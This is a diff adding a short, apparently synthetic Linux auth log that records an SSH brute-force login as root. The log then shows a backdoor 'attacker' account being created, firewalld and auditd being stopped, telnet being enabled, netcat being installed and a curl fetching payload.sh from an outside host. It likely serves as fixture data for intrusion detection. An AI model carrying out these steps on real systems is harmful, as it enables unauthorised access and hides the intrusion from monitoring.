@@ -1,0 +1,24 @@
+Jun 17 01:01:01 server01 sshd[2001]: Failed password for root from 203.0.113.50 port 42100 ssh2
+Jun 17 01:01:03 server01 sshd[2002]: Failed password for root from 203.0.113.50 port 42101 ssh2
+Jun 17 01:01:05 server01 sshd[2003]: Failed password for root from 203.0.113.50 port 42102 ssh2
+Jun 17 01:01:07 server01 sshd[2004]: Failed password for root from 203.0.113.50 port 42103 ssh2
+Jun 17 01:01:09 server01 sshd[2005]: Failed password for root from 203.0.113.50 port 42104 ssh2
+Jun 17 01:01:11 server01 sshd[2006]: Accepted password for root from 203.0.113.50 port 42105 ssh2
+
+Jun 17 01:03:55 server01 sudo:    root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/useradd attacker
+
+Jun 17 01:04:01 server01 useradd[2100]: new user: name=attacker, UID=1005, GID=1005, home=/home/attacker, shell=/bin/bash
+
+Jun 17 01:04:20 server01 passwd[2101]: password changed for attacker
+
+Jun 17 01:05:44 server01 sshd[2150]: Accepted password for attacker from 203.0.113.50 port 43011 ssh2
+
+Jun 17 01:08:12 server01 systemd[1]: Stopped firewalld.service
+
+Jun 17 01:08:17 server01 systemd[1]: Stopped auditd.service
+
+Jun 17 01:08:33 server01 systemd[1]: Started telnet.socket
+
+Jun 17 01:09:10 server01 sudo:    attacker : TTY=pts/2 ; PWD=/home/attacker ; USER=root ; COMMAND=/usr/bin/apt install netcat
+
+Jun 17 01:10:11 server01 sudo:    attacker : TTY=pts/2 ; PWD=/home/attacker ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.77/payload.sh
